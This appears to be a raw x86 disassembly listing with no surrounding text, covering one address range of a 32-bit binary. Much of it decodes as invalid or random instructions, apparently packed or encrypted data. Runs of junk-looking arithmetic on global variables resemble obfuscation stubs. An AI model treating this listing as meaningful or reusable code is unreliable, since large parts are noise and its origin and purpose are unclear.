  403df8:	sub    DWORD PTR ds:0x4283bd,0x5e3f
  403e02:	shl    ecx,0x1e
  403e05:	sbb    DWORD PTR ds:0x4283bd,0x5068
  403e0f:	add    edx,DWORD PTR [ebp-0x2c]
  403e12:	jmp    0x4041b3
  403e17:	bound  ecx,QWORD PTR [ebx-0x73d3f5ff]
  403e1d:	push   0xffffffab
  403e1f:	(bad)  
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	push   ss
  403e22:	shl    DWORD PTR [esi-0x412e950c],1
  403e28:	cmc    
  403e29:	mov    esi,0xbec4bdbe
  403e2e:	mov    esi,0xd9759eb5
  403e33:	iret   
  403e34:	inc    ebx
  403e35:	dec    edx
  403e36:	enter  0x6557,0x48
  403e3a:	gs pushf 
  403e3c:	arpl   WORD PTR [esi+edi*1-0x4d],dx
  403e40:	loop   0x403e41
  403e42:	push   es
  403e43:	push   esi
  403e44:	mov    ebx,0x3b6f9b8f
  403e49:	mov    cl,0x80
  403e4b:	inc    esp
  403e4c:	sbb    DWORD PTR [esi+esi*4-0x7f55b88f],esi
  403e53:	sub    esp,DWORD PTR [edx+0x8]
  403e56:	mov    DWORD PTR [eax+0x7e9a3dcc],ecx
  403e5c:	jmp    0xad4745f9
  403e61:	loopne 0x403e8a
  403e63:	and    DWORD PTR [ebp-0x2e5d1b24],ebx
  403e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e6a:	xor    ch,BYTE PTR [ebx+0x200488a]
  403e70:	sar    DWORD PTR [ecx-0x23],cl
  403e73:	sub    dl,BYTE PTR [edx]
  403e75:	jge    0x403e42
  403e77:	add    DWORD PTR [ebp-0x6cefb0ff],0xc6b4dfb1
  403e81:	stc    
  403e82:	pushf  
  403e83:	in     al,0xf1
  403e85:	ja     0x403e09
  403e87:	pop    esp
  403e88:	lods   al,BYTE PTR ds:[esi]
  403e89:	lods   al,BYTE PTR ds:[esi]
  403e8a:	xchg   ebx,eax
  403e8b:	(bad)  
  403e8c:	pop    eax
  403e8d:	push   esp
  403e8e:	shr    DWORD PTR [esi],cl
  403e90:	mov    ebp,0xdb3cc2cf
  403e95:	arpl   WORD PTR [ecx],si
  403e97:	and    al,0x3c
  403e99:	jl     0x403e1e
  403e9b:	ins    BYTE PTR es:[edi],dx
  403e9c:	mov    esi,0x9bdb52ea
  403ea1:	arpl   ax,bx
  403ea3:	mov    eax,ds:0xf4b4c8a7
  403ea8:	jmp    0xa2a6:0x7abdb433
  403eaf:	(bad)  
  403eb0:	imul   esp,DWORD PTR [ebx+eax*4+0x12ed0fdd],0x8e033507
  403ebb:	dec    ebp
  403ebc:	add    al,BYTE PTR [ebp+0x50afa564]
  403ec2:	out    0x9c,eax
  403ec4:	cdq    
  403ec5:	jb     0x403e5d
  403ec7:	dec    edi
  403ec8:	xor    eax,0x57dc31ea
  403ecd:	pop    ecx
  403ece:	sub    edi,0x58b0dcb5
  403ed4:	js     0x403f54
  403ed6:	sub    esi,ecx
  403ed8:	out    0xb4,al
  403eda:	push   esi
  403edb:	pop    esp
  403edc:	push   0x620f997a
  403ee1:	fist   WORD PTR [ebp+0x68]
  403ee4:	mov    al,ds:0xd6648576
  403ee9:	call   0x894ed984
  403eee:	jmp    0x7bf:0x2105765
  403ef5:	inc    edi
  403ef6:	dec    edi
  403ef7:	dec    edx
  403ef8:	pop    ds
  403ef9:	push   cs
  403efa:	push   ecx
  403efb:	jp     0x403ef3
  403efd:	outs   dx,BYTE PTR ds:[esi]
  403efe:	ins    BYTE PTR es:[edi],dx
  403eff:	cmp    al,BYTE PTR [edi-0x7c27b6e2]
  403f05:	dec    edx
  403f06:	stos   BYTE PTR es:[edi],al
  403f07:	in     eax,0x82
  403f09:	pusha  
  403f0a:	cmp    al,ch
  403f0c:	int3   
  403f0d:	mov    al,ds:0x30f01ff
  403f12:	mov    ds:0xf8cbb43f,al
  403f17:	cmp    BYTE PTR fs:[esi+0x5037e746],0xd4
  403f1f:	ret    0x3373
  403f22:	inc    esp
  403f23:	outs   dx,DWORD PTR ds:[esi]
  403f24:	mov    esi,0x2e783f56
  403f29:	dec    ecx
  403f2a:	shr    bh,0xd6
  403f2d:	jae    0x403f7b
  403f2f:	jb     0x403f29
  403f31:	jp     0x403fa4
  403f33:	jmp    0x403fac
  403f35:	xor    cl,BYTE PTR [ebp-0x42]
  403f38:	mov    al,ds:0x7e0b7a28
  403f3d:	mov    dl,0xa9
  403f3f:	lds    edx,FWORD PTR [ecx-0x3c34cee8]
  403f45:	push   edx
  403f46:	neg    bl
  403f48:	inc    edi
  403f49:	adc    BYTE PTR [eax-0xf],bh
  403f4c:	ret    0x3dee
  403f4f:	or     eax,0x14e4b8cf
  403f54:	stc    
  403f55:	in     eax,dx
  403f56:	pop    ebx
  403f57:	adc    BYTE PTR [ebx-0x263e1ddf],cl
  403f5d:	push   edx
  403f5e:	int    0x8
  403f60:	or     eax,0xdce1dcb7
  403f65:	xlat   BYTE PTR ds:[ebx]
  403f66:	pop    ebp
  403f67:	pop    ss
  403f68:	mov    edx,0x1296b606
  403f6d:	xor    BYTE PTR [edx],0xf7
  403f70:	push   edi
  403f71:	test   al,0x89
  403f73:	adc    bh,BYTE PTR [edx]
  403f75:	test   BYTE PTR [edx],al
  403f77:	loope  0x403fac
  403f79:	push   cs
  403f7a:	xchg   edx,eax
  403f7b:	js     0x403f91
  403f7d:	outs   dx,DWORD PTR ds:[esi]
  403f7e:	push   ss
  403f7f:	xor    eax,0x6df64bae
  403f84:	daa    
  403f85:	jnp    0x403f19
  403f87:	mov    ds:0xfbe24233,al
  403f8c:	paddsb mm5,QWORD PTR ds:0xef51e202
  403f93:	mov    ah,0x97
  403f95:	or     edx,edi
  403f97:	add    BYTE PTR [edx+0x47d19290],0x65
  403f9e:	xchg   esi,eax
  403f9f:	inc    esp
  403fa0:	inc    ebp
  403fa1:	mov    eax,0xaeef5576
  403fa6:	mov    ds:0x10c49385,al
  403fab:	fucomi st,st(5)
  403fad:	popa   
  403fae:	hlt    
  403faf:	inc    edi
  403fb0:	cmp    esi,ebp
  403fb2:	cmp    ebp,ebx
  403fb4:	jne    0x403fc0
  403fb6:	ins    DWORD PTR es:[edi],dx
  403fb7:	mov    edi,0xaef27ee7
  403fbc:	push   edx
  403fbd:	jmp    0x27dcb4d5
  403fc2:	xchg   esp,eax
  403fc3:	adc    esi,DWORD PTR ds:0x23fabe26
  403fc9:	sbb    al,0x76
  403fcb:	addr16 push es
  403fcd:	je     0x403ffc
  403fcf:	xor    DWORD PTR [edx-0x7ae3e072],edi
  403fd5:	cli    
  403fd6:	adc    ebp,DWORD PTR ds:0xecf14b68
  403fdc:	xor    DWORD PTR [ebp+0x6a],0x4b5d5443
  403fe3:	lock cs (bad) 
  403fe6:	retf   
  403fe7:	adc    BYTE PTR [eax-0x39a8e1df],cl
  403fed:	gs cld 
  403fef:	mov    dl,0xeb
  403ff1:	out    0x6c,eax
  403ff3:	and    al,0xef
  403ff5:	stos   BYTE PTR es:[edi],al
  403ff6:	sti    
  403ff7:	out    dx,eax
  403ff8:	(bad)  
  403ff9:	in     eax,0xe0
  403ffb:	push   ecx
  403ffc:	call   ecx
  403ffe:	call   0x5f37e22
  404003:	cli    
  404004:	aas    
  404005:	arpl   WORD PTR [ecx-0x41],cx
  404008:	push   ss
  404009:	xor    al,ah
  40400b:	mov    al,0xff
  40400d:	jno    0x403fba
  40400f:	mov    dl,0x50
  404011:	das    
  404012:	xchg   esi,eax
  404013:	jne    0x404085
  404015:	adc    bl,0xf7
  404018:	jmp    0x404091
  40401a:	shl    BYTE PTR [ebp-0x70f72494],cl
  404020:	in     eax,dx
  404021:	(bad)  
  404022:	sbb    esi,eax
  404024:	sbb    ebp,edx
  404026:	adc    BYTE PTR [eax],0xd5
  404029:	int3   
  40402a:	shl    DWORD PTR [esi-0x43503883],cl
  404030:	ds aas 
  404032:	loopne 0x404073
  404034:	loope  0x40404a
  404036:	ins    BYTE PTR es:[edi],dx
  404037:	sahf   
  404038:	pop    gs
  40403a:	stos   DWORD PTR es:[edi],eax
  40403b:	fwait
  40403c:	mov    ebx,0x6d594bd4
  404041:	add    ebx,esi
  404043:	push   0x52
  404045:	ret    
  404046:	jns    0x403ffe
  404048:	xor    BYTE PTR [ebx+edi*8-0x2f5bc727],bh
  40404f:	xchg   BYTE PTR [ecx+0x58a91a59],ch
  404055:	pop    ds
  404056:	fimul  WORD PTR [esi+edx*1-0x23]
  40405a:	(bad)  
  40405c:	test   eax,0xbc5adb4c
  404061:	jle    0x40409a
  404063:	lock mov esi,0xa2fc5d5b
  404069:	jnp    0x4040d0
  40406b:	leave  
  40406c:	inc    edx
  40406d:	cld    
  40406e:	sar    BYTE PTR [eax-0x71],cl
  404071:	shl    DWORD PTR [esi],0xb7
  404074:	loop   0x40404d
  404076:	scas   al,BYTE PTR es:[edi]
  404077:	(bad)
  40407b:	pop    ecx
  40407c:	iret   
  40407d:	cmp    ebx,DWORD PTR [esi-0x4ca3afe1]
  404083:	add    DWORD PTR [ebp-0x3e],0xffffffef
  404087:	push   ds
  404088:	addr16 test eax,0x4ee400a9
  40408e:	cmp    DWORD PTR [edi+0x19],0xa92917f0
  404095:	inc    esp
  404096:	fadd   QWORD PTR [ebp-0x18]
  404099:	ror    BYTE PTR [eax],1
  40409b:	into   
  40409c:	test   esi,eax
  40409e:	lods   eax,DWORD PTR ds:[esi]
  40409f:	popa   
  4040a0:	fsub   QWORD PTR [ecx-0x500c1d6f]
  4040a6:	xor    ch,al
  4040a8:	and    al,0xbe
  4040aa:	(bad)  
  4040ab:	adc    al,0x60
  4040ad:	(bad)  
  4040ae:	loope  0x404033
  4040b0:	pop    ds
  4040b1:	cwde   
  4040b2:	pushf  
  4040b3:	pusha  
  4040b4:	inc    esi
  4040b5:	push   edi
  4040b6:	in     al,dx
  4040b7:	cmp    BYTE PTR [edi-0x7578339c],dh
  4040bd:	cdq    
  4040be:	push   ds
  4040bf:	pusha  
  4040c0:	inc    ecx
  4040c1:	mov    bh,0xb
  4040c3:	mov    WORD PTR [edi],gs
  4040c5:	das    
  4040c6:	ja     0x40408c
  4040c8:	mov    ebx,0xd2d19ed4
  4040cd:	icebp  
  4040ce:	sar    BYTE PTR [ebx],cl
  4040d0:	mov    bl,BYTE PTR [eax-0x5]
  4040d3:	test   al,0x50
  4040d5:	sub    cl,0x92
  4040d8:	ss adc ebx,esp
  4040db:	rol    BYTE PTR [ebx+0x20143206],cl
  4040e1:	push   ss
  4040e2:	cwde   
  4040e3:	lods   al,BYTE PTR ds:[esi]
  4040e4:	call   0x32d86b7a
  4040e9:	pop    ebx
  4040ea:	xchg   edx,eax
  4040eb:	shl    BYTE PTR [esi+0x2e],1
  4040ee:	and    ebx,DWORD PTR [ebx]
  4040f0:	popf   
  4040f1:	push   ss
  4040f2:	mov    edx,0x9761b52f
  4040f7:	ds mov al,0x4e
  4040fa:	mov    ds:0xa08f0d72,al
  4040ff:	mov    bh,0xa8
  404101:	sub    ecx,DWORD PTR [esi-0x2]
  404104:	pushf  
  404105:	dec    ebp
  404106:	pushf  
  404107:	ins    DWORD PTR es:[edi],dx
  404108:	push   esi
  404109:	daa    
  40410a:	test   BYTE PTR [ebx+ecx*4+0x6f03c135],dl
  404111:	mov    ebx,0x3447e6ef
  404116:	mov    eax,ds:0x69947d4
  40411b:	xchg   ecx,eax
  40411c:	call   0xd250716d
  404121:	cdq    
  404122:	cmp    esp,ebp
  404124:	jecxz  0x40417f
  404126:	adc    esi,DWORD PTR [esi]
  404128:	fs xor ebp,ecx
  40412b:	in     eax,0x94
  40412d:	int3   
  40412e:	and    ebp,ebp
  404130:	pop    esp
  404131:	dec    eax
  404132:	sbb    edi,DWORD PTR [edi+0x24a057e6]
  404138:	and    edx,ecx
  40413a:	js     0x4041ac
  40413c:	cmp    eax,DWORD PTR [edi-0x6fa29fff]
  404142:	mov    ss,WORD PTR [edi]
  404144:	sub    al,0x4f
  404146:	pop    esi
  404147:	sbb    eax,0x75856d27
  40414c:	cmp    DWORD PTR [ebx+ecx*1+0x61],eax
  404150:	jg     0x4041bd
  404152:	mov    bl,0xbd
  404154:	mov    ch,0x64
  404156:	jmp    0x40411f
  404158:	lods   al,BYTE PTR ds:[esi]
  404159:	test   eax,0x1c2f3153
  40415e:	into   
  40415f:	fwait
  404160:	and    eax,0x1fac624a
  404165:	xor    al,0xe9
  404167:	dec    edi
  404168:	inc    ecx
  404169:	jns    0x404178
  40416b:	mov    ch,0x9
  40416d:	hlt    
  40416e:	mov    edi,0xc6b5c73c
  404173:	sub    ch,BYTE PTR [eax-0x559cd4b6]
  404179:	and    eax,0x5bfc39e9
  40417e:	loopne 0x4041ba
  404180:	into   
  404181:	call   0xdb324ce0
  404186:	jge    0x40414f
  404188:	fs (bad) 
  40418a:	and    BYTE PTR [edi+0x57],bl
  40418d:	ficom  WORD PTR cs:[eax-0x2a3ec526]
  404194:	mov    BYTE PTR [eax],ah
  404196:	cmp    DWORD PTR [edx+edi*8+0x2d4b8f77],0x75ff9795
  4041a1:	mov    dh,0x6
  4041a3:	test   al,0x3f
  4041a5:	cdq    
  4041a6:	iret   
  4041a7:	mov    ecx,ss
  4041a9:	or     ebp,edi
  4041ab:	push   0x3c40e274
  4041b0:	jae    0x404132
  4041b2:	pop    edi
  4041b3:	add    DWORD PTR [eax],edx
  4041b5:	cmp    DWORD PTR ds:0x428425,0x0
  4041bc:	not    ecx
  4041be:	mov    DWORD PTR ds:0x4282e1,0x38eb
  4041c8:	jmp    0x40423c
  4041cd:	mov    edx,DWORD PTR ds:0x42847d
  4041d3:	cmp    DWORD PTR ds:0x428425,0x0
  4041da:	jne    0x40421e
  4041e0:	push   DWORD PTR [ebp-0x1c]
  4041e3:	push   0x3daa
  4041e8:	push   0x6a0e
  4041ed:	call   DWORD PTR ds:0x42dff8
  4041f3:	mov    edx,DWORD PTR ds:0x4283d5
  4041f9:	xor    edx,DWORD PTR ds:0x428511
  4041ff:	mov    DWORD PTR ds:0x4283d5,edx
  404205:	or     edx,DWORD PTR ds:0x4284b1
  40420b:	movzx  edx,WORD PTR ds:0x4283ed
  404212:	and    DWORD PTR ds:0x428411,edx
  404218:	xor    ecx,0x6193
  40421e:	add    edx,0x3a4f
  404224:	add    DWORD PTR ds:0x4283c1,ecx
  40422a:	mov    ecx,DWORD PTR ds:0x42838d
  404230:	mov    edx,DWORD PTR ds:0x4284d1
  404236:	sub    ecx,edx
  404238:	imul   ecx,DWORD PTR [ecx+edx*1]
  40423c:	mov    eax,DWORD PTR [esi]
  40423e:	cmp    DWORD PTR ds:0x428421,0x0
  404245:	mov    DWORD PTR ds:0x428315,0x80f
  40424f:	mov    DWORD PTR ds:0x428519,ecx
  404255:	jmp    0x4042b8
  40425a:	mov    DWORD PTR ds:0x4283cd,0x4518
  404264:	cmp    DWORD PTR ds:0x428421,0x0
  40426b:	jb     0x404293
  404271:	push   DWORD PTR [ebp-0x10]
  404274:	call   DWORD PTR ds:0x42dffc
  40427a:	adc    edx,0x1a1
  404280:	xor    ecx,ecx
  404282:	add    ecx,DWORD PTR ds:0x428461
  404288:	mov    edx,DWORD PTR ds:0x428551
  40428e:	sub    ecx,edx
  404290:	xor    ecx,DWORD PTR [ecx+edx*1]
  404293:	add    DWORD PTR ds:0x4283ed,0x3b89
  40429d:	sbb    DWORD PTR ds:0x428531,ecx
  4042a3:	sub    edx,edx
  4042a5:	movzx  ecx,WORD PTR ds:0x428499
  4042ac:	xor    ecx,DWORD PTR ds:0x428509
  4042b2:	mov    DWORD PTR ds:0x428499,ecx
  4042b8:	mov    ecx,DWORD PTR [esi+0x4]
  4042bb:	shrd   eax,ecx,0x2
  4042bf:	shr    ecx,0x2
  4042c2:	cmp    DWORD PTR ds:0x428529,0x0
  4042c9:	mov    DWORD PTR ds:0x428499,ecx
  4042cf:	mov    DWORD PTR ds:0x428429,0x365d
  4042d9:	jmp    0x404321
  4042de:	mov    DWORD PTR ds:0x4283e5,0x759d
  4042e8:	cmp    DWORD PTR ds:0x428529,0x0
  4042ef:	jae    0x404315
  4042f5:	call   DWORD PTR ds:0x42e248
  4042fb:	adc    edx,ecx
  4042fd:	mov    ecx,DWORD PTR ds:0x4283d9
  404303:	and    ecx,DWORD PTR ds:0x428515
  404309:	mov    DWORD PTR ds:0x4283d9,ecx
  40430f:	sbb    edx,DWORD PTR ds:0x428311
  404315:	sbb    DWORD PTR ds:0x4283e9,0x7721
  40431f:	add    ecx,ecx
  404321:	mov    ecx,DWORD PTR [esi]
  404323:	mov    edx,DWORD PTR [esi+0x4]
  404326:	xor    eax,edi
  404328:	shl    ecx,0x1e
  40432b:	xor    edx,edx
  40432d:	or     edx,eax
  40432f:	mov    DWORD PTR [ebp-0x4],edx
  404332:	mov    DWORD PTR [ebp-0x30],0xcb79b576
  404339:	mov    eax,0x9c2b8ae8
  40433e:	mov    DWORD PTR [ebp-0x2c],eax
  404341:	mov    DWORD PTR [ebp-0x20],0xcb79b572
  404348:	mov    DWORD PTR [ebp-0x1c],eax
  40434b:	mov    DWORD PTR [ebp-0x10],0xcb79b57e
  404352:	mov    DWORD PTR [ebp-0xc],eax
  404355:	mov    DWORD PTR [ebp-0x60],0xcb79b57a
  40435c:	mov    DWORD PTR [ebp-0x5c],eax
  40435f:	jmp    0x404700
  404364:	cmp    BYTE PTR [eax+0x14],dh
  404367:	cmp    al,0x9c
  404369:	mov    esp,0xa24d7438
  40436e:	mov    BYTE PTR [eax+edx*4-0x422ee3de],ah
  404375:	sti    
  404376:	mov    esi,0xbec4bdbe
  40437b:	mov    esi,0xdb2e65ce
  404380:	hlt    
  404381:	imul   edx,DWORD PTR [ebx],0xbcf85a07
  404387:	pop    esi
  404388:	pop    ebp
  404389:	dec    ebp
  40438a:	mov    ebp,0x4c50f9c8
  40438f:	stc    
  404390:	pop    ds
  404391:	xchg   edi,eax
  404392:	xchg   ebp,eax
  404393:	sub    BYTE PTR [ebp-0x113e813e],dl
  404399:	xor    al,0x85
  40439b:	adc    al,0xf0
  40439d:	or     edx,ebx
  40439f:	mov    ebx,0xe036db11
  4043a4:	add    DWORD PTR [ecx],edi
  4043a6:	fs adc eax,0xfc25c36f
  4043ac:	ss (bad) 
  4043ae:	fst    DWORD PTR [ebp+0x7f54fc53]
  4043b4:	outs   dx,BYTE PTR ds:[esi]
  4043b5:	dec    esi
  4043b6:	out    dx,eax
  4043b7:	dec    esi
  4043b8:	je     0x404389
  4043ba:	sbb    eax,0x5ca73d8a
  4043bf:	cmp    eax,0xde365ddf
  4043c4:	jmp    0x400563e9
  4043c9:	jne    0x404418
  4043cb:	mov    dh,0xc5
  4043cd:	add    esi,ebp
  4043cf:	xchg   esp,eax
  4043d0:	retf   
  4043d1:	jno    0x4043b0
  4043d3:	push   ebx
  4043d4:	cmp    cl,BYTE PTR [ecx+edx*2]
  4043d7:	stos   BYTE PTR es:[edi],al
  4043d8:	add    DWORD PTR [ebp+0x55],ebp
  4043db:	cmp    BYTE PTR [ebp-0x6a9dbae3],al
  4043e1:	push   ds
  4043e2:	(bad)  
  4043e3:	jae    0x404452
  4043e5:	jnp    0x404457
  4043e7:	pop    esp
  4043e8:	idiv   ah
  4043ea:	sbb    ah,al
  4043ec:	retf   
  4043ed:	addr16 stc 
  4043ef:	jns    0x40439c
  4043f1:	sahf   
  4043f2:	outs   dx,BYTE PTR ds:[esi]
  4043f3:	lods   eax,DWORD PTR ds:[esi]
  4043f4:	loopne 0x40442a
  4043f6:	or     ebp,ecx
  4043f8:	mov    dl,0xce
  4043fa:	lahf   
  4043fb:	jmp    0x4043e8
  4043fd:	mov    esi,0xc99e6561
  404402:	lods   al,BYTE PTR ds:[esi]
  404403:	test   al,0x8
  404405:	fmul   DWORD PTR [edx+ebp*1+0x1d]
  404409:	push   cs
  40440a:	fsub   QWORD PTR [esi-0x3a0199f9]
  404410:	fdiv   st,st(5)
  404412:	dec    edx
  404413:	and    eax,0x1cd74f9f
  404418:	mov    bh,0xe7
  40441a:	add    DWORD PTR [edx+0x5c],ebp
  40441d:	push   es
  40441e:	mov    DWORD PTR [ebx-0x3ede83d9],ebx
  404424:	jp     0x4043fe
  404426:	mov    dh,0x8d
  404428:	jo     0x40441e
  40442a:	push   ebx
  40442b:	pop    ebx
  40442c:	jecxz  0x40442f
  40442e:	rcr    DWORD PTR cs:[edx-0x67],cl
  404432:	je     0x404445
  404434:	mov    ds,WORD PTR [eax]
  404436:	lods   al,BYTE PTR ds:[esi]
  404437:	inc    edi
  404438:	inc    eax
  404439:	push   eax
  40443a:	in     al,0x89
  40443c:	test   al,0x76
  40443e:	push   es
  40443f:	das    
  404440:	(bad)  [ebx]
  404442:	xchg   ebx,eax
  404443:	pop    DWORD PTR [edi-0x49921fd5]
  404449:	test   eax,0x719a49e8
  40444e:	xchg   ecx,eax
  40444f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404451:	pop    es
  404452:	pop    ds
  404453:	inc    esp
  404454:	dec    edi
  404455:	in     eax,0xe2
  404457:	nop
  404458:	stc    
  404459:	jge    0x404439
  40445b:	cmc    
  40445c:	xor    eax,0x1ab59bd8
  404461:	test   al,0x4c
  404463:	imul   ecx,DWORD PTR [edi-0x56],0x7a5fa8c5
  40446a:	jns    0x404473
  40446c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40446d:	sub    DWORD PTR [eax+0x31],esp
  404470:	sub    BYTE PTR [ebx+0x1140be28],ah
  404476:	push   eax
  404477:	aad    0x24
  404479:	dec    esi
  40447a:	push   ebp
  40447b:	lahf   
  40447c:	pop    ss
  40447d:	jo     0x404424
  40447f:	sbb    ah,BYTE PTR [ebx]
  404481:	mov    dh,BYTE PTR [edi]
  404483:	cmp    dh,cl
  404485:	mov    ds:0x621b362e,eax
  40448a:	push   cs
  40448b:	or     cl,ah
  40448d:	(bad)  
  40448e:	jle    0x40449d
  404490:	xchg   dh,bh
  404492:	mov    bl,0x76
  404494:	ins    BYTE PTR es:[edi],dx
  404495:	add    BYTE PTR [eax+0x20],ch
  404498:	int3   
  404499:	dec    edx
  40449a:	sub    eax,DWORD PTR [edx+0x4b39c380]
  4044a0:	push   edx
  4044a1:	mul    DWORD PTR [edx]
  4044a3:	outs   dx,DWORD PTR ds:[esi]
  4044a4:	push   cs
  4044a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044a6:	pop    edi
  4044a7:	in     eax,0xbf
  4044a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044aa:	xchg   ebp,eax
  4044ab:	pop    eax
  4044ac:	add    eax,0x844f3d29
  4044b1:	inc    edx
  4044b2:	inc    esp
  4044b3:	pushf  
  4044b4:	mov    dl,0xe4
  4044b6:	dec    edx
  4044b7:	pushf  
  4044b8:	push   ecx
  4044b9:	or     eax,0x84fb325f
  4044be:	adc    eax,0x27749b52
  4044c3:	jle    0x404461
  4044c5:	and    al,0xb2
  4044c7:	cli    
  4044c8:	jns    0x404544
  4044ca:	test   eax,0x73ef6cc5
  4044cf:	addr16 xor al,0x79
  4044d2:	repz leave 
  4044d4:	adc    al,ch
  4044d6:	pop    esp
  4044d7:	data16 adc dl,BYTE PTR [eax+esi*2+0x43970ee3]
  4044df:	pop    es
  4044e0:	push   esp
  4044e1:	xor    al,0x93
  4044e3:	repnz sub DWORD PTR [ebx-0x575713e9],eax
  4044ea:	sub    eax,0x8e962b62
  4044ef:	dec    esp
  4044f0:	fldenv [ecx]
  4044f2:	(bad)
  4044f5:	mov    al,0x23
  4044f7:	mov    esp,0xea5ae947
  4044fc:	data16 or al,0xfb
  4044ff:	iret   
  404500:	push   ecx
  404501:	jmp    0x40452e
  404503:	lahf   
  404504:	mov    edx,0xb82a3283
  404509:	test   al,0xed
  40450b:	repnz dec esi
  40450d:	mov    esp,?
  40450f:	jnp    0x404542
  404511:	test   eax,0xbf85b00a
  404516:	stos   DWORD PTR es:[edi],eax
  404517:	ss call 0xeca9:0x1627c3a4
  40451f:	pop    edx
  404520:	in     eax,dx
  404521:	jmp    0xbb8e:0xec4ec070
  404528:	mov    ecx,0xabbbc4f9
  40452d:	cld    
  40452e:	mov    ebx,0x3eef804d
  404533:	sub    BYTE PTR [ebx+0x4f01c64b],cl
  404539:	mov    ch,0x74
  40453b:	fstp   DWORD PTR [ebx-0x14]
  40453e:	nop
  40453f:	pop    eax
  404540:	stc    
  404541:	popf   
  404542:	pop    ebp
  404543:	aad    0x7c
  404545:	jp     0x4045c4
  404547:	xor    dh,BYTE PTR [eax]
  404549:	mov    bh,BYTE PTR ds:0x54d8a7c6
  40454f:	xchg   esp,eax
  404550:	mov    edi,0x1493bec
  404555:	push   0x93ad7a97
  40455a:	xor    ah,BYTE PTR [ebp+0x50]
  40455d:	xor    eax,0x2a93bb0d
  404562:	(bad)  
  404563:	imul   edx,DWORD PTR [ecx],0xa7558be7
  404569:	test   eax,0x250cfab
  40456e:	push   ss
  40456f:	mov    dl,BYTE PTR [ecx-0x77]
  404572:	fidiv  WORD PTR ds:0xdd0a1eeb
  40457a:	or     DWORD PTR [edx+0x75],edx
  40457d:	jg     0x40452d
  40457f:	add    esp,ebp
  404581:	retf   
  404582:	call   0xb8b95ba1
  404587:	push   ebx
  404588:	mov    esp,0x1d925f3a
  40458d:	adc    DWORD PTR [esi+0x5bf4834c],ebx
  404593:	ret    0x7206
  404596:	(bad)
  404599:	fisub  WORD PTR [ecx-0x3c]
  40459c:	hlt    
  40459d:	std    
  40459e:	and    esp,esi
  4045a0:	leave  
  4045a1:	mov    bl,0x5b
  4045a3:	mov    esi,0xcd32bcf3
  4045a8:	pushf  
  4045a9:	cdq    
  4045aa:	dec    ebp
  4045ab:	sub    al,BYTE PTR [edx]
  4045ad:	test   edi,edx
  4045af:	outs   dx,DWORD PTR ds:[esi]
  4045b0:	aaa    
  4045b1:	pop    esi
  4045b2:	adc    BYTE PTR [edx],0x79
  4045b5:	push   edi
  4045b6:	pop    edi
  4045b7:	sbb    eax,0x9a581ace
  4045bc:	sbb    dl,BYTE PTR ds:0x72853243
  4045c2:	push   ebp
  4045c3:	sbb    BYTE PTR [ebx+esi*4],ch
  4045c6:	aam    0xd4
  4045c8:	jne    0x40454f
  4045ca:	xchg   ebp,eax
  4045cb:	shl    DWORD PTR [edi],cl
  4045cd:	push   cs
  4045ce:	stc    
  4045cf:	pusha  
  4045d0:	sbb    eax,0xebb8a459
  4045d5:	setb   BYTE PTR [ecx]
  4045d8:	imul   esp,eax,0xf5d15ba9
  4045de:	jo     0x4045c5
  4045e0:	stc    
  4045e1:	xor    al,0xed
  4045e3:	or     al,0x5c
  4045e5:	outs   dx,DWORD PTR ds:[esi]
  4045e6:	mov    al,ds:0x87d0d3f4
  4045eb:	mov    ebp,0xdb3e9d4f
  4045f0:	in     al,dx
  4045f1:	cld    
  4045f2:	pop    esi
  4045f3:	retf   
  4045f4:	add    DWORD PTR [ebx-0x6d],ecx
  4045f7:	rcr    al,1
  4045f9:	outs   dx,BYTE PTR ds:[esi]
  4045fa:	xor    cl,BYTE PTR [edx-0x6a]
  4045fd:	sub    eax,DWORD PTR [ebp+0x2920bcce]
  404603:	imul   eax,DWORD PTR gs:[ecx],0xb8fc55ef
  40460a:	add    esi,DWORD PTR [edx]
  40460c:	div    DWORD PTR [edi]
  40460e:	add    BYTE PTR [eax],0x8f
  404611:	cmp    dh,al
  404613:	out    dx,al
  404614:	bound  ecx,QWORD PTR [edi+0x1]
  404617:	cmp    ebx,DWORD PTR [edi+0x4467abb6]
  40461d:	xor    ecx,ebp
  40461f:	(bad)  
  404620:	(bad)  
  404621:	fisttp QWORD PTR [ebx]
  404623:	call   0xb03da558
  404628:	(bad)  
  404629:	fld    TBYTE PTR [ebx+ebx*2-0x33]
  40462d:	push   cs
  40462e:	enter  0xe156,0x37
  404632:	adc    BYTE PTR ds:0xb2b4db81,ah
  404638:	ror    DWORD PTR [ebp-0x2b],0xb3
  40463c:	sbb    al,0xd5
  40463e:	sbb    dl,0xc4
  404641:	mov    edx,0x4ca08916
  404646:	into   
  404647:	lods   al,BYTE PTR ds:[esi]
  404648:	repnz popa 
  40464a:	sbb    al,0x69
  40464c:	add    al,0x33
  40464e:	mov    edx,0x34f261e2
  404653:	jl     0x40460f
  404655:	arpl   WORD PTR [ecx],bp
  404657:	inc    ebx
  404658:	push   ebx
  404659:	and    eax,0x2a82b9f8
  40465e:	shl    DWORD PTR [edx-0x59129dd2],0x5a
  404665:	mov    ds:0x7427c382,eax
  40466a:	test   DWORD PTR [edi-0x2b],ebp
  40466d:	mov    eax,0xb3c287c4
  404672:	lahf   
  404673:	sub    ebx,DWORD PTR [edi+0x1d2111dd]
  404679:	jno    0x4045fe
  40467b:	xchg   edx,eax
  40467c:	cmp    esi,DWORD PTR [edx-0x784597c3]
  404682:	pop    edi
  404683:	es loop 0x40465f
  404686:	rcr    BYTE PTR ds:0x3ee72b78,1
  40468c:	push   ecx
  40468d:	xor    esp,ecx
  40468f:	xchg   ebp,eax
  404690:	jmp    0xcfcd:0x53e3573d
  404697:	push   ebx
  404698:	pusha  
  404699:	and    al,0xe8
  40469b:	mov    bl,al
  40469d:	fldenv [esp+ebp*2+0x11db28d]
  4046a4:	xor    eax,0x61322ae5
  4046a9:	mov    dh,0x4d
  4046ab:	jle    0x404714
  4046ad:	out    dx,al
  4046ae:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046b0:	clc    
  4046b1:	outs   dx,DWORD PTR ds:[esi]
  4046b2:	mov    bh,0x8f
  4046b4:	fild   DWORD PTR [edx-0x17]
  4046b7:	pop    eax
